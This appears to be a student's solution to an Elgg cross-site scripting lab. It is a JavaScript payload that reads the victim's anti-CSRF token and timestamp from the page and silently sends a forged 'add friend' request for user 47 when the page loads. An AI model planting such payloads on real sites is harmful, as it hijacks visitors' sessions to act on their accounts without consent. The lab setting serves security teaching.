//Inspected the network tab to see what request was sent when 'Add Friend' was clicked
//Found a request like this
//http://www.xsslabelgg.com/action/friends/add?friend=47&__elgg_ts=1624225536&__elgg_token=0FxKP0uaQkKUGHwwBZTr9A&__elgg_ts=1624225536&__elgg_token=0FxKP0uaQkKUGHwwBZTr9A"

<script type="text/javascript">
	window.onload = function () {
	var Ajax=null;
	var ts="&__elgg_ts="+elgg.security.token.__elgg_ts;
	var token="&__elgg_token="+elgg.security.token.__elgg_token;
	//Construct the HTTP request to add Samy as a friend.

	var sendurl="http://www.xsslabelgg.com/action/friends/add?friend=47"+ts+token+ts+token;
	//&__elgg_ts=1624225536&__elgg_token=0FxKP0uaQkKUGHwwBZTr9A&__elgg_ts=1624225536&__elgg_token=0FxKP0uaQkKUGHwwBZTr9A"; //FILL IN

	//Create and send Ajax request to add friend
	Ajax=new XMLHttpRequest();
	Ajax.open("GET",sendurl,true);
	Ajax.setRequestHeader("Host","www.xsslabelgg.com");
	Ajax.setRequestHeader("Content-Type","application/x-www-form-urlencoded");
	Ajax.send();
	}
</script>